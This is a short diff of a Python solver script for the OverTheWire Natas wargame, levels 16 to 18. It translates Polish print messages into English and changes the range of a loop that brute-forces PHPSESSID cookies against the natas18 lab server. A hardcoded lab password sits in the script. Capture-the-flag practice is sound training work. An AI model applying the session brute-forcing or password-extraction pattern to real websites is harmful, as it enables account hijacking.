@@ -79,7 +79,7 @@ def level16():
             else:
                 direction = 'pre'
 
-    print("Znalazłam hasło: " + password)
+    print("Found password: " + password)
     return True
 
 
@@ -120,7 +120,7 @@ def level17():
             print('NOTHING FOUND FOR ' + password)
         i += 1
 
-    print("Znalazłam hasło: " + password)
+    print("Found password: " + password)
     return True
 
 
@@ -130,7 +130,7 @@ def level18():
 
     credentials = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
 
-    for i in range(0, 1000):
+    for i in range(0, 641):
         cookie = {"PHPSESSID": str(i)}
         r = requests.get('http://natas18.natas.labs.overthewire.org/index.php', cookies=cookie, auth=credentials)
         if r.text.__contains__("You are logged in as a regular user"):
